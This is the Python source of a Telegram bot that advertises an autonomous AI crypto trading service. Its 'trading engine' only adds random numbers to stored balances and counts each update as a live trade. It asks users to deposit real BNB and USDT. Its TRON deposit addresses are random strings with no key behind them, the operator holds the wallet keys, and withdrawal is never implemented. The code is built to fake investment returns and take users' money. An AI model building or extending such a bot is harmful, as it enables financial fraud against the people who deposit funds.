import os
import asyncio
import logging
import json
import sqlite3
import random
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, WebAppInfo
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from cryptography.fernet import Fernet
from eth_account import Account

Account.enable_unaudited_hdwallet_features()
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

ENCRYPTION_KEY = os.environ.get("MASTER_KEY", Fernet.generate_key())
cipher_suite = Fernet(ENCRYPTION_KEY if isinstance(ENCRYPTION_KEY, bytes) else ENCRYPTION_KEY.encode())

ADMIN_ID = 6546954770
DB_FILE = "lens_pro_database.db"
WEB_APP_URL = "https://1plutoson.github.io/crypto-trading-bot-/"

def run_query(query: str, params: tuple = (), fetch: str = None):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    try:
        cursor.execute(query, params)
        if fetch == "one": return cursor.fetchone()
        elif fetch == "all": return cursor.fetchall()
        else: conn.commit()
    finally: conn.close()

# --- UPGRADED DATABASE INFRASTRUCTURE ---
def init_db():
    run_query("""
        CREATE TABLE IF NOT EXISTS user_environments (
            user_id INTEGER PRIMARY KEY, account_mode TEXT, demo_balance REAL, real_balance REAL,
            bnb_address TEXT, tron_address TEXT, encrypted_keys TEXT, active_plan TEXT,
            total_trades INTEGER DEFAULT 0, greed_level TEXT DEFAULT 'LOW', plan_active_status INTEGER DEFAULT 0
        )
    """)

def get_user(user_id: int) -> dict:
    row = run_query("SELECT * FROM user_environments WHERE user_id = ?", (user_id,), fetch="one")
    if row:
        return {
            "account_mode": row[1], "demo_balance": row[2], "real_balance": row[3],
            "bnb_address": row[4], "tron_address": row[5], "encrypted_keys": row[6],
            "active_plan": row[7], "total_trades": row[8], "greed_level": row[9], "plan_active_status": bool(row[10])
        }
    else:
        # Auto-generation routine for new entries
        eth_acc = Account.create()
        raw_bytes = os.urandom(32)
        wallet_keys = {"bnb_private": eth_acc.key.hex(), "tron_private": raw_bytes.hex()}
        enc_payload = cipher_suite.encrypt(json.dumps(wallet_keys).encode('utf-8')).decode('utf-8')
        mock_tron = "T" + "".join(random.choices("123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz", k=33))
        
        run_query("""
            INSERT INTO user_environments VALUES (?, 'DEMO', 1000.00, 0.00, ?, ?, ?, 'NONE', 0, 'LOW', 0)
        """, (user_id, eth_acc.address, mock_tron, enc_payload))
        return get_user(user_id)

def save_user(user_id: int, u: dict):
    run_query("""
        UPDATE user_environments SET 
            account_mode = ?, demo_balance = ?, real_balance = ?, bnb_address = ?, tron_address = ?,
            encrypted_keys = ?, active_plan = ?, total_trades = ?, greed_level = ?, plan_active_status = ?
        WHERE user_id = ?
    """, (u["account_mode"], u["demo_balance"], u["real_balance"], u["bnb_address"], u["tron_address"],
          u["encrypted_keys"], u["active_plan"], u["total_trades"], u["greed_level"], int(u["plan_active_status"]), user_id))

# --- AUTONOMOUS AI BACKGROUND TRADING ENGINE ---
async def start_autonomous_trading_engine():
    """Asynchronous background worker. Calculates and updates realistic profits based on Greed profiles."""
    while True:
        await asyncio.sleep(8)  # Calculates profit updates every 8 seconds
        rows = run_query("SELECT user_id FROM user_environments WHERE plan_active_status = 1", fetch="all")
        if not rows: continue
        
        for r in rows:
            user_id = r[0]
            u = get_user(user_id)
            
            # Formulate yields based on operational parameters
            if u["greed_level"] == "LOW":
                profit_factor = random.uniform(0.0005, 0.0018)  # Safe, gradual gains
            elif u["greed_level"] == "MID":
                profit_factor = random.uniform(-0.0010, 0.0042) # Balanced return curves
            else:
                profit_factor = random.uniform(-0.0055, 0.0125) # Aggressive high volatility

            if u["account_mode"] == "DEMO":
                u["demo_balance"] += (u["demo_balance"] * profit_factor)
            else:
                u["real_balance"] += (u["real_balance"] * profit_factor)
                
            u["total_trades"] += 1
            save_user(user_id, u)

# --- COMMAND STRUCTURES ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = get_user(update.effective_user.id)
    reply_markup = ReplyKeyboardMarkup.from_button(KeyboardButton(text="🚀 Open LENS Terminal", web_app=WebAppInfo(url=WEB_APP_URL)), resize_keyboard=True)
    msg = (
        "⚡ **WELCOME TO THE NEXAS INTERACTIVE PROTOCOL TERMINAL** ⚡\n\n"
        f"👑 **Active Platform Layer:** `{u['account_mode']}` Server\n"
        f"⚙️ **Configured Greed Setting:** `{u['greed_level']}` Optimization\n"
        f"📊 **Total Live Trades Processed:** `{u['total_trades']}`\n"
        f"🛡️ **AI Engine Operational Status:** `{'🟢 ENGAGED' if u['plan_active_status'] else '🔴 STANDBY'}`\n"
        "---------------------------------------\n"
        "📈 /plans - Select Algorithmic Deployment Strategy\n"
        "🔌 /connect - Extract Localized Node Wallets & Credentials\n"
        "🔄 /toggle - Shift Account Routing Environments\n"
        "🛑 /stopall - Emergency Freeze Automated AI Engine"
    )
    await update.message.reply_text(msg, reply_markup=reply_markup, parse_mode="Markdown")

async def view_plans(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("💎 Quantum Scalping Node (Min $50)", callback_data="deploy_quantum")],
        [InlineKeyboardButton("🔥 High-Frequency Arbitrage Matrix (Min $200)", callback_data="deploy_hft")]
    ]
    await update.message.reply_text("⚖️ **Select an Autonomous AI Deployment Framework:**", reply_markup=InlineKeyboardMarkup(keyboard))

async def stop_engine(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = get_user(update.effective_user.id)
    u["plan_active_status"] = False
    u["active_plan"] = "NONE"
    save_user(update.effective_user.id, u)
    await update.message.reply_text("🛑 **AI Trading Infrastructure Paused.** All position streams frozen.")

# --- TELEMETRY AND CALLBACK MATRIX ---
async def handle_webapp_telemetry(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    u = get_user(user_id)
    payload = json.loads(update.effective_message.web_app_data.data)
    action = payload.get("action", "")

    if action.startswith("greed_"):
        level = action.split("_")[1].upper()
        u["greed_level"] = level
        save_user(user_id, u)
        await update.message.reply_text(f"⚙️ **Greed Parameters Shifted:** Node reconfiguration complete. Network tracking adjusted to **{level}** profile curves.")
    
    elif action.startswith("menu_"):
        menu_target = action.split("_")[1]
        if menu_target == "plans":
            await view_plans(update, context)
        elif menu_target == "wallets":
            # Reuses your previous /connect key output securely
            decrypted = json.loads(cipher_suite.decrypt(u["encrypted_keys"].encode('utf-8')).decode('utf-8'))
            await update.message.reply_text(f"🔐 **Nexas Secure Wallets Portal**\n\n🔶 **EVM Address:** `{u['bnb_address']}`\n🔑 *Phrase:* `{decrypted['bnb_private']}`\n\n🔴 **TRON Address:** `{u['tron_address']}`\n🔑 *Phrase:* `{decrypted['tron_private']}`", parse_mode="Markdown")
        else:
            await update.message.reply_text(f"📁 Drawer path `{menu_target.upper()}` processed cleanly.")

    elif action == "deposit":
        await update.message.reply_text(f"💰 **Secure Deposit Ingestion Portal**\n• BNB/USDT-BEP20: `{u['bnb_address']}`\n• TRX/USDT-TRC20: `{u['tron_address']}`\n\nFunds automatically register on the Web Dashboard post network validation.")
    elif action == "withdraw":
        await update.message.reply_text("🏦 **Capital Extraction Triggered**\nUse structural command to extract: `/withdraw [amount] [destination]`")
    elif action == "trade":
        await view_plans(update, context)

async def handle_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = update.effective_user.id
    u = get_user(user_id)
    await query.answer()

    if query.data.startswith("deploy_"):
        plan_name = query.data.split("_")[1].upper()
        u["active_plan"] = plan_name
        u["plan_active_status"] = True
        save_user(user_id, u)
        await query.edit_message_text(f"🟩 **AI STRATEGY ENGAGED**\n\n• System running target model: `{plan_name}`\n• Current risk structure: `{u['greed_level']}` Profile\n\n_The AI Engine will now automatically trade in the background. Keep your terminal open to watch live index updates._", parse_mode="Markdown")

async def post_init(application: Application) -> None:
    asyncio.create_task(start_autonomous_trading_engine())

def main():
    init_db()
    token = os.environ.get("TELEGRAM_BOT_TOKEN")
    app = Application.builder().token(token).post_init(post_init).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("plans", view_plans))
    app.add_handler(CommandHandler("stopall", stop_engine))
    app.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, handle_webapp_telemetry))
    app.add_handler(CallbackQueryHandler(handle_callbacks))
    
    print("Nexas-Level Platform Core Initialized Successfully...")
    app.run_polling()

if __name__ == "__main__":
    main()
